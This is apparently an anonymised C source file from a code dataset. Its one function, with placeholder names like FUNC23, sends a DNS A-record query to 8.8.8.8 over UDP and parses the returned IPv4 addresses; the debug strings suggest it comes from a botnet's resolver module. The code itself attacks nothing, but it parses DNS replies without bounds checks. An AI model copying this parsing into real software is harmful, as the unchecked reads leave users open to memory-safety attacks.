#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  char uint8_t ;
typedef  int uint32_t ;
typedef  scalar_t__ uint16_t ;
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {scalar_t__ sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; int /*<<< orphan*/  member_0; } ;
struct sockaddr {int dummy; } ;
struct resolv_entries {int* addrs; int addrs_len; } ;
struct dnshdr {scalar_t__ id; scalar_t__ ancount; scalar_t__ qdcount; scalar_t__ opts; } ;
struct dnsans {int dummy; } ;
struct dns_resource {scalar_t__ type; scalar_t__ _class; scalar_t__ data_len; } ;
struct dns_question {scalar_t__ qclass; scalar_t__ qtype; } ;
typedef  int /*<<< orphan*/  response ;
typedef  int /*<<< orphan*/  ipv4_t ;
typedef  int /*<<< orphan*/  fd_set ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 scalar_t__ FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  F_GETFL ; 
 int /*<<< orphan*/  F_SETFL ; 
 int /*<<< orphan*/  FUNC3 (int,int,int,int) ; 
 int /*<<< orphan*/  MSG_NOSIGNAL ; 
 int O_NONBLOCK ; 
 int PROTO_DNS_QCLASS_IP ; 
 int PROTO_DNS_QTYPE_A ; 
 int /*<<< orphan*/  SOCK_DGRAM ; 
 struct resolv_entries* FUNC4 (int,int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int FUNC6 (int,struct sockaddr*,int) ; 
 int errno ; 
 int FUNC7 (int /*<<< orphan*/ ,int,int) ; 
 scalar_t__ FUNC8 (int) ; 
 int FUNC9 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 int FUNC11 () ; 
 int* FUNC12 (int*,int) ; 
 int FUNC13 (int,char*,int,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*) ; 
 int /*<<< orphan*/  FUNC15 (struct resolv_entries*) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*,int*) ; 
 int FUNC17 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,struct timeval*) ; 
 int FUNC18 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC19 (int) ; 
 int FUNC20 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC21 (char*) ; 
 int /*<<< orphan*/  FUNC22 (struct sockaddr_in*,int) ; 

struct resolv_entries *FUNC23(char *domain)
{
    struct resolv_entries *entries = FUNC4(1, sizeof (struct resolv_entries));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    FUNC14(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + FUNC21(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof (struct dnshdr) + FUNC21(qname) + 1 + sizeof (struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = FUNC11() % 0xffff;

    FUNC22(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = FUNC3(8,8,8,8);
    addr.sin_port = FUNC8(53);

    // Set up the dns query
    dnsh->id = dns_id;
    dnsh->opts = FUNC8(1 << 8); // Recursion desired
    dnsh->qdcount = FUNC8(1);
    dnst->qtype = FUNC8(PROTO_DNS_QTYPE_A);
    dnst->qclass = FUNC8(PROTO_DNS_QCLASS_IP);

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            FUNC5(fd);
        if ((fd = FUNC20(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to create socket\n");
#endif
            FUNC19(1);
            continue;
        }

        if (FUNC6(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to call connect on udp socket\n");
#endif
            FUNC19(1);
            continue;
        }

        if (FUNC18(fd, query, query_len, MSG_NOSIGNAL) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to send packet: %d\n", errno);
#endif
            FUNC19(1);
            continue;
        }

        FUNC7(F_SETFL, fd, O_NONBLOCK | FUNC7(F_GETFL, fd, 0));
        FUNC2(&fdset);
        FUNC1(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = FUNC17(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1)
        {
#ifdef DEBUG
            printf("[resolv] select() failed\n");
#endif
            break;
        }
        else if (nfds == 0)
        {
#ifdef DEBUG
            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
#endif
            continue;
        }
        else if (FUNC0(fd, &fdset))
        {
#ifdef DEBUG
            printf("[resolv] Got response from select\n");
#endif
            int ret = FUNC13(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (sizeof (struct dnshdr) + FUNC21(qname) + 1 + sizeof (struct dns_question)))
                continue;

            dnsh = (struct dnshdr *)response;
            qname = (char *)(dnsh + 1);
            dnst = (struct dns_question *)(qname + FUNC21(qname) + 1);
            name = (char *)(dnst + 1);

            if (dnsh->id != dns_id)
                continue;
            if (dnsh->ancount == 0)
                continue;

            ancount = FUNC9(dnsh->ancount);
            while (ancount-- > 0)
            {
                struct dns_resource *r_data = NULL;

                FUNC16(name, response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

                if (r_data->type == FUNC8(PROTO_DNS_QTYPE_A) && r_data->_class == FUNC8(PROTO_DNS_QCLASS_IP))
                {
                    if (FUNC9(r_data->data_len) == 4)
                    {
                        uint32_t *p;
                        uint8_t tmp_buf[4];
                        for(i = 0; i < 4; i++)
                            tmp_buf[i] = name[i];

                        p = (uint32_t *)tmp_buf;

                        entries->addrs = FUNC12(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                        entries->addrs[entries->addrs_len++] = (*p);
#ifdef DEBUG
                        printf("[resolv] Found IP address: %08x\n", (*p));
#endif
                    }

                    name = name + FUNC9(r_data->data_len);
                } else {
                    FUNC16(name, response, &stop);
                    name = name + stop;
                }
            }
        }

        break;
    }

    FUNC5(fd);

#ifdef DEBUG
    printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
#endif

    if (entries->addrs_len > 0)
        return entries;
    else
    {
        FUNC15(entries);
        return NULL;
    }
}